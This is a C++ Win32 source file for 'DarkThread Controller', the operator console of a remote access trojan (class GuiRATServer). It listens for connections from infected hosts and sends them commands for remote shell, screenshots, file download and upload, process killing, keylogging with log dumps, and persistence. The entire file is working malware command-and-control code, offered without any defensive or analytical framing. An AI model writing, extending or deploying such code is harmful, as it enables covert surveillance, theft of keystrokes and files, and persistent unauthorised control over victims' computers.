#include "gui_server.h"
#include <fstream>
#include <sstream>
#include <algorithm>
#include <ctime>
#include <ws2tcpip.h>

static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_CREATE) {
        CREATESTRUCT* cs = (CREATESTRUCT*)lParam;
        SetWindowLongPtr(hwnd, GWLP_USERDATA, (LONG_PTR)cs->lpCreateParams);
    }
    GuiRATServer* server = (GuiRATServer*)GetWindowLongPtr(hwnd, GWLP_USERDATA);
    if (server) return server->HandleMessage(hwnd, msg, wParam, lParam);
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

GuiRATServer::GuiRATServer(HINSTANCE hInst) : m_hInst(hInst) {}

GuiRATServer::~GuiRATServer() {
    m_running = false;
    if (m_listenSock != INVALID_SOCKET) closesocket(m_listenSock);
    std::lock_guard<std::mutex> lock(m_clientsMutex);
    for (auto& c : m_clients) {
        if (c.sock != INVALID_SOCKET) closesocket(c.sock);
    }
}

bool GuiRATServer::Create() {
    WNDCLASSEXA wc = {};
    wc.cbSize = sizeof(WNDCLASSEXA);
    wc.lpfnWndProc = WndProc;
    wc.hInstance = m_hInst;
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_3DFACE + 1);
    wc.lpszClassName = "DarkThreadGUI";
    wc.hIcon = LoadIcon(nullptr, IDI_APPLICATION);
    RegisterClassExA(&wc);

    m_hwnd = CreateWindowExA(0, "DarkThreadGUI", "DarkThread Controller v1.0",
        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 950, 620,
        nullptr, nullptr, m_hInst, this);

    return m_hwnd != nullptr;
}

void GuiRATServer::Show(int nCmdShow) {
    ShowWindow(m_hwnd, nCmdShow);
    UpdateWindow(m_hwnd);
}

void GuiRATServer::OnCreate(HWND hwnd) {
    m_hwnd = hwnd;

    HFONT hFont = CreateFontA(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, FF_DONTCARE, "Segoe UI");

    m_hClientList = CreateWindowExA(WS_EX_CLIENTEDGE, "LISTBOX", "",
        WS_CHILD | WS_VISIBLE | WS_VSCROLL | LBS_NOTIFY | LBS_NOINTEGRALHEIGHT,
        0, 0, 0, 0, hwnd, (HMENU)IDC_CLIENT_LIST, m_hInst, nullptr);

    m_hLog = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "",
        WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_READONLY | ES_AUTOVSCROLL,
        0, 0, 0, 0, hwnd, (HMENU)IDC_LOG, m_hInst, nullptr);

    m_hCmdInput = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "",
        WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL,
        0, 0, 0, 0, hwnd, (HMENU)IDC_CMD_INPUT, m_hInst, nullptr);

    m_hSendBtn = CreateWindowExA(0, "BUTTON", "Send",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
        0, 0, 0, 0, hwnd, (HMENU)IDC_SEND_BTN, m_hInst, nullptr);

    struct { int id; const char* label; HWND* handle; } btns[] = {
        { IDC_BTN_SCREEN,     "Screenshot",  &m_hBtnScreen     },
        { IDC_BTN_SYSINFO,    "SysInfo",     &m_hBtnSysInfo    },
        { IDC_BTN_KL_START,   "KL Start",    &m_hBtnKLStart    },
        { IDC_BTN_KL_DUMP,    "KL Dump",     &m_hBtnKLDump     },
        { IDC_BTN_PROCS,      "Procs",       &m_hBtnProcs      },
        { IDC_BTN_PERSIST,    "Persist",     &m_hBtnPersist    },
        { IDC_BTN_DISCONNECT, "Disconnect",  &m_hBtnDisconnect },
    };

    for (auto& b : btns) {
        *b.handle = CreateWindowExA(0, "BUTTON", b.label,
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            0, 0, 0, 0, hwnd, (HMENU)b.id, m_hInst, nullptr);
        SendMessageA(*b.handle, WM_SETFONT, (WPARAM)hFont, TRUE);
    }

    m_hStatusBar = CreateWindowExA(0, STATUSCLASSNAMEA, "",
        WS_CHILD | WS_VISIBLE | SBARS_SIZEGRIP,
        0, 0, 0, 0, hwnd, (HMENU)200, m_hInst, nullptr);

    SendMessageA(m_hClientList, WM_SETFONT, (WPARAM)hFont, TRUE);
    SendMessageA(m_hLog, WM_SETFONT, (WPARAM)hFont, TRUE);
    SendMessageA(m_hCmdInput, WM_SETFONT, (WPARAM)hFont, TRUE);
    SendMessageA(m_hSendBtn, WM_SETFONT, (WPARAM)hFont, TRUE);

    WSAData wsa{};
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        PostLog("[!] WSAStartup failed.");
        return;
    }

    m_listenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (m_listenSock == INVALID_SOCKET) {
        PostLog("[!] socket() failed.");
        return;
    }

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(m_port);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(m_listenSock, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        PostLog("[!] bind() failed: " + std::to_string(WSAGetLastError()));
        closesocket(m_listenSock);
        m_listenSock = INVALID_SOCKET;
        return;
    }

    if (listen(m_listenSock, SOMAXCONN) == SOCKET_ERROR) {
        PostLog("[!] listen() failed: " + std::to_string(WSAGetLastError()));
        closesocket(m_listenSock);
        m_listenSock = INVALID_SOCKET;
        return;
    }

    m_running = true;

    PostLog("=============================================");
    PostLog("  DarkThread Controller v1.0");
    PostLog("  Listening on 0.0.0.0:" + std::to_string(m_port));
    PostLog("  Waiting for client connections...");
    PostLog("=============================================\r\n");

    std::thread(&GuiRATServer::AcceptLoop, this).detach();

    UpdateStatusBar();
    OnSize(hwnd);
}

void GuiRATServer::OnSize(HWND hwnd) {
    RECT rc;
    GetClientRect(hwnd, &rc);
    int w = rc.right;
    int h = rc.bottom;

    SendMessageA(m_hStatusBar, WM_SIZE, 0, 0);
    RECT rcStatus;
    GetWindowRect(m_hStatusBar, &rcStatus);
    int statusH = rcStatus.bottom - rcStatus.top;

    int contentH = h - statusH;
    int margin = 4;
    int clientListW = 210;
    int btnH = 28;
    int btnW = 85;
    int cmdH = 26;
    int btnCount = 7;

    int btnY = contentH - cmdH - btnH - margin * 3;
    int cmdY = contentH - cmdH - margin;

    int logX = clientListW + margin * 2;
    int logW = w - clientListW - margin * 3;

    MoveWindow(m_hClientList, margin, margin, clientListW,
        contentH - cmdH - btnH - margin * 4, TRUE);

    MoveWindow(m_hLog, logX, margin, logW, btnY - margin * 2, TRUE);

    HWND btnHandles[] = { m_hBtnScreen, m_hBtnSysInfo, m_hBtnKLStart,
                          m_hBtnKLDump, m_hBtnProcs, m_hBtnPersist,
                          m_hBtnDisconnect };
    for (int i = 0; i < btnCount; i++) {
        MoveWindow(btnHandles[i], logX + i * (btnW + margin), btnY, btnW, btnH, TRUE);
    }

    int cmdW = w - logX - btnW - margin * 2;
    MoveWindow(m_hCmdInput, logX, cmdY, cmdW, cmdH, TRUE);
    MoveWindow(m_hSendBtn, logX + cmdW + margin, cmdY, btnW, cmdH, TRUE);
}

void GuiRATServer::OnCommand(HWND hwnd, WPARAM wParam) {
    int id = LOWORD(wParam);
    int notif = HIWORD(wParam);

    switch (id) {
    case IDC_SEND_BTN:
        if (notif == BN_CLICKED) OnSendCommand();
        break;
    case IDC_BTN_SCREEN:     if (notif == BN_CLICKED) OnQuickAction(IDC_BTN_SCREEN);     break;
    case IDC_BTN_SYSINFO:    if (notif == BN_CLICKED) OnQuickAction(IDC_BTN_SYSINFO);    break;
    case IDC_BTN_KL_START:   if (notif == BN_CLICKED) OnQuickAction(IDC_BTN_KL_START);   break;
    case IDC_BTN_KL_DUMP:    if (notif == BN_CLICKED) OnQuickAction(IDC_BTN_KL_DUMP);    break;
    case IDC_BTN_PROCS:      if (notif == BN_CLICKED) OnQuickAction(IDC_BTN_PROCS);      break;
    case IDC_BTN_PERSIST:    if (notif == BN_CLICKED) OnQuickAction(IDC_BTN_PERSIST);    break;
    case IDC_BTN_DISCONNECT: if (notif == BN_CLICKED) OnQuickAction(IDC_BTN_DISCONNECT); break;
    case IDC_CLIENT_LIST:
        if (notif == LBN_SELCHANGE) OnClientSelected();
        break;
    }
}

void GuiRATServer::OnClientSelected() {
    int sel = (int)SendMessageA(m_hClientList, LB_GETCURSEL, 0, 0);
    m_selectedClient = (sel == LB_ERR) ? -1 : sel;
    UpdateStatusBar();
}

void GuiRATServer::OnSendCommand() {
    char buf[4096];
    GetWindowTextA(m_hCmdInput, buf, sizeof(buf));
    if (strlen(buf) == 0) return;

    if (m_selectedClient < 0) {
        PostLog("[!] No client selected. Click a client in the list first.");
        return;
    }

    std::string cmdStr(buf);
    SetWindowTextA(m_hCmdInput, "");

    std::istringstream iss(cmdStr);
    std::string cmd;
    iss >> cmd;
    std::transform(cmd.begin(), cmd.end(), cmd.begin(), ::tolower);

    DarkProtocol::CommandID cmdId = (DarkProtocol::CommandID)0;
    std::string payload;

    if (cmd == "shell") {
        cmdId = DarkProtocol::CMD_SHELL;
        std::getline(iss, payload);
        if (!payload.empty() && payload[0] == ' ') payload.erase(0, 1);
        PostLog("> shell " + payload);
    }
    else if (cmd == "screenshot" || cmd == "screen") {
        cmdId = DarkProtocol::CMD_SCREENSHOT;
        PostLog("> screenshot");
    }
    else if (cmd == "ls" || cmd == "dir") {
        cmdId = DarkProtocol::CMD_FILE_LIST;
        std::getline(iss, payload);
        if (!payload.empty() && payload[0] == ' ') payload.erase(0, 1);
        PostLog("> ls " + payload);
    }
    else if (cmd == "download") {
        cmdId = DarkProtocol::CMD_FILE_DOWNLOAD;
        iss >> payload;
        PostLog("> download " + payload);
    }
    else if (cmd == "upload") {
        std::string remotePath, localPath;
        iss >> remotePath >> localPath;
        std::ifstream file(localPath, std::ios::binary);
        if (!file.is_open()) {
            PostLog("[!] Cannot open local file: " + localPath);
            return;
        }
        std::string content((std::istreambuf_iterator<char>(file)),
            std::istreambuf_iterator<char>());
        file.close();
        payload = remotePath + "|" + content;
        cmdId = DarkProtocol::CMD_FILE_UPLOAD;
        PostLog("> upload " + remotePath + " <- " + localPath);
    }
    else if (cmd == "ps" || cmd == "processes") {
        cmdId = DarkProtocol::CMD_PROCESS_LIST;
        PostLog("> ps");
    }
    else if (cmd == "kill") {
        cmdId = DarkProtocol::CMD_PROCESS_KILL;
        iss >> payload;
        PostLog("> kill " + payload);
    }
    else if (cmd == "sysinfo") {
        cmdId = DarkProtocol::CMD_SYSINFO;
        PostLog("> sysinfo");
    }
    else if (cmd == "keylog") {
        std::string sub;
        iss >> sub;
        std::transform(sub.begin(), sub.end(), sub.begin(), ::tolower);
        if (sub == "start") { cmdId = DarkProtocol::CMD_KEYLOG_START; PostLog("> keylog start"); }
        else if (sub == "stop") { cmdId = DarkProtocol::CMD_KEYLOG_STOP; PostLog("> keylog stop"); }
        else if (sub == "dump") { cmdId = DarkProtocol::CMD_KEYLOG_DUMP; PostLog("> keylog dump"); }
        else { PostLog("[!] Usage: keylog start|stop|dump"); return; }
    }
    else if (cmd == "persist") {
        cmdId = DarkProtocol::CMD_PERSIST;
        PostLog("> persist");
    }
    else if (cmd == "exit" || cmd == "disconnect") {
        cmdId = DarkProtocol::CMD_DISCONNECT;
        PostLog("> disconnect");
    }
    else {
        PostLog("[!] Unknown command: " + cmd);
        PostLog("    Available: shell, screenshot, ls, download, upload, ps, kill, sysinfo, keylog, persist, disconnect");
        return;
    }

    ExecuteCommand(m_selectedClient, cmdId, payload);
}

void GuiRATServer::OnQuickAction(int btnId) {
    if (m_selectedClient < 0) {
        PostLog("[!] No client selected. Click a client in the list first.");
        return;
    }

    switch (btnId) {
    case IDC_BTN_SCREEN:
        PostLog("> screenshot");
        ExecuteCommand(m_selectedClient, DarkProtocol::CMD_SCREENSHOT, "");
        break;
    case IDC_BTN_SYSINFO:
        PostLog("> sysinfo");
        ExecuteCommand(m_selectedClient, DarkProtocol::CMD_SYSINFO, "");
        break;
    case IDC_BTN_KL_START:
        PostLog("> keylog start");
        ExecuteCommand(m_selectedClient, DarkProtocol::CMD_KEYLOG_START, "");
        break;
    case IDC_BTN_KL_DUMP:
        PostLog("> keylog dump");
        ExecuteCommand(m_selectedClient, DarkProtocol::CMD_KEYLOG_DUMP, "");
        break;
    case IDC_BTN_PROCS:
        PostLog("> ps");
        ExecuteCommand(m_selectedClient, DarkProtocol::CMD_PROCESS_LIST, "");
        break;
    case IDC_BTN_PERSIST:
        PostLog("> persist");
        ExecuteCommand(m_selectedClient, DarkProtocol::CMD_PERSIST, "");
        break;
    case IDC_BTN_DISCONNECT:
        PostLog("> disconnect");
        ExecuteCommand(m_selectedClient, DarkProtocol::CMD_DISCONNECT, "");
        break;
    }
}

void GuiRATServer::AcceptLoop() {
    while (m_running) {
        sockaddr_in clientAddr{};
        int addrLen = sizeof(clientAddr);
        SOCKET clientSock = accept(m_listenSock, (sockaddr*)&clientAddr, &addrLen);
        if (clientSock == INVALID_SOCKET) continue;

        char ipStr[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, ipStr, sizeof(ipStr));

        DarkProtocol::CommandID cmd;
        std::string payload;
        if (!DarkProtocol::RecvPacket(clientSock, cmd, payload) ||
            cmd != DarkProtocol::CMD_HEARTBEAT) {
            closesocket(clientSock);
            continue;
        }

        std::string hostname = "unknown";
        size_t sep = payload.find('|');
        if (sep != std::string::npos) hostname = payload.substr(sep + 1);

        GuiClient client;
        client.sock = clientSock;
        client.hostname = hostname;
        client.ip = ipStr;
        client.connected = true;

        {
            std::lock_guard<std::mutex> lock(m_clientsMutex);
            m_clients.push_back(std::move(client));
        }

        std::string* info = new std::string(hostname + " (" + ipStr + ")");
        PostMessageA(m_hwnd, WM_NEW_CLIENT, 0, (LPARAM)info);

        PostLog("[+] New client: " + hostname + " (" + ipStr + ")");
    }
}

void GuiRATServer::ExecuteCommand(int clientIdx, DarkProtocol::CommandID cmd, const std::string& payload) {
    if (m_cmdInProgress.exchange(true)) {
        PostLog("[!] Another command is still running. Please wait.");
        return;
    }

    std::thread([this, clientIdx, cmd, payload]() {
        SOCKET sock;
        std::string clientName;
        {
            std::lock_guard<std::mutex> lock(m_clientsMutex);
            if (clientIdx < 0 || clientIdx >= (int)m_clients.size()) {
                PostLog("[!] Invalid client selection.");
                m_cmdInProgress = false;
                return;
            }
            sock = m_clients[clientIdx].sock;
            clientName = m_clients[clientIdx].hostname + " (" + m_clients[clientIdx].ip + ")";
        }

        PostLog("[*] Sending to " + clientName + "...");

        if (!DarkProtocol::SendPacket(sock, cmd, payload)) {
            PostLog("[-] Send failed. Client may be offline: " + clientName);
            PostMessageA(m_hwnd, WM_CLIENT_LEFT, clientIdx, 0);
            m_cmdInProgress = false;
            return;
        }

        DarkProtocol::CommandID respCmd;
        std::string resp;
        if (!DarkProtocol::RecvPacket(sock, respCmd, resp)) {
            PostLog("[-] No response. Client disconnected: " + clientName);
            PostMessageA(m_hwnd, WM_CLIENT_LEFT, clientIdx, 0);
            m_cmdInProgress = false;
            return;
        }

        if (cmd == DarkProtocol::CMD_SCREENSHOT) {
            std::string filename = "screenshot_" + std::to_string(time(nullptr)) + ".png";
            std::ofstream file(filename, std::ios::binary);
            file.write(resp.data(), resp.size());
            file.close();
            PostLog("[+] Screenshot saved: " + filename + " (" + std::to_string(resp.size()) + " bytes)");
        }
        else if (cmd == DarkProtocol::CMD_FILE_DOWNLOAD) {
            size_t lastSlash = payload.find_last_of("\\/");
            std::string filename = (lastSlash != std::string::npos)
                ? payload.substr(lastSlash + 1) : "downloaded_file";
            std::ofstream file(filename, std::ios::binary);
            file.write(resp.data(), resp.size());
            file.close();
            PostLog("[+] File saved: " + filename + " (" + std::to_string(resp.size()) + " bytes)");
        }
        else {
            if (resp.empty()) {
                PostLog("[*] (empty response)");
            }
            else {
                PostLog(resp);
            }
        }

        m_cmdInProgress = false;
        }).detach();
}

void GuiRATServer::PostLog(const std::string& msg) {
    std::string* p = new std::string(msg + "\r\n");
    PostMessageA(m_hwnd, WM_LOG_MSG, 0, (LPARAM)p);
}

void GuiRATServer::AppendToLog(const std::string& text) {
    int len = GetWindowTextLengthA(m_hLog);
    SendMessageA(m_hLog, EM_SETSEL, len, len);
    SendMessageA(m_hLog, EM_REPLACESEL, FALSE, (LPARAM)text.c_str());
    SendMessageA(m_hLog, EM_SCROLLCARET, 0, 0);
}

void GuiRATServer::UpdateStatusBar() {
    std::string status;
    {
        std::lock_guard<std::mutex> lock(m_clientsMutex);
        status = "Listening on :" + std::to_string(m_port) +
            "  |  Clients: " + std::to_string(m_clients.size());
        if (m_selectedClient >= 0 && m_selectedClient < (int)m_clients.size()) {
            status += "  |  Selected: " + m_clients[m_selectedClient].hostname +
                " (" + m_clients[m_selectedClient].ip + ")";
        }
    }
    SetWindowTextA(m_hStatusBar, status.c_str());
}

void GuiRATServer::RefreshClientListUnsafe() {
    SendMessageA(m_hClientList, LB_RESETCONTENT, 0, 0);
    for (const auto& c : m_clients) {
        std::string entry = c.hostname + " (" + c.ip + ")";
        SendMessageA(m_hClientList, LB_ADDSTRING, 0, (LPARAM)entry.c_str());
    }
}

LRESULT GuiRATServer::HandleMessage(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE:
        OnCreate(hwnd);
        return 0;

    case WM_SIZE:
        if (m_hStatusBar) OnSize(hwnd);
        return 0;

    case WM_GETMINMAXINFO: {
        MINMAXINFO* mmi = (MINMAXINFO*)lParam;
        mmi->ptMinTrackSize.x = 750;
        mmi->ptMinTrackSize.y = 450;
        return 0;
    }

    case WM_COMMAND:
        OnCommand(hwnd, wParam);
        return 0;

    case WM_NEW_CLIENT: {
        std::string* info = (std::string*)lParam;
        SendMessageA(m_hClientList, LB_ADDSTRING, 0, (LPARAM)info->c_str());
        delete info;
        UpdateStatusBar();
        return 0;
    }

    case WM_CLIENT_LEFT: {
        int idx = (int)wParam;
        {
            std::lock_guard<std::mutex> lock(m_clientsMutex);
            if (idx >= 0 && idx < (int)m_clients.size()) {
                closesocket(m_clients[idx].sock);
                m_clients.erase(m_clients.begin() + idx);
            }
            RefreshClientListUnsafe();
        }
        if (m_selectedClient == idx) {
            m_selectedClient = -1;
        }
        else if (m_selectedClient > idx) {
            m_selectedClient--;
        }
        UpdateStatusBar();
        return 0;
    }

    case WM_LOG_MSG: {
        std::string* p = (std::string*)lParam;
        AppendToLog(*p);
        delete p;
        return 0;
    }

    case WM_CLOSE:
        DestroyWindow(hwnd);
        return 0;

    case WM_DESTROY:
        m_running = false;
        if (m_listenSock != INVALID_SOCKET) {
            closesocket(m_listenSock);
            m_listenSock = INVALID_SOCKET;
        }
        {
            std::lock_guard<std::mutex> lock(m_clientsMutex);
            for (auto& c : m_clients) {
                if (c.sock != INVALID_SOCKET) closesocket(c.sock);
            }
            m_clients.clear();
        }
        WSACleanup();
        PostQuitMessage(0);
        return 0;

    default:
        return DefWindowProcA(hwnd, msg, wParam, lParam);
    }
}

int GuiRATServer::MessageLoop() {
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        if (msg.message == WM_KEYDOWN && msg.wParam == VK_RETURN) {
            if (GetFocus() == m_hCmdInput) {
                OnSendCommand();
                continue;
            }
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return (int)msg.wParam;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int nCmdShow) {
    INITCOMMONCONTROLSEX icc = { sizeof(icc), ICC_BAR_CLASSES };
    InitCommonControlsEx(&icc);

    GuiRATServer server(hInst);
    if (!server.Create()) {
        MessageBoxA(nullptr, "Failed to create window", "Error", MB_ICONERROR);
        return 1;
    }

    server.Show(nCmdShow);
    return server.MessageLoop();
}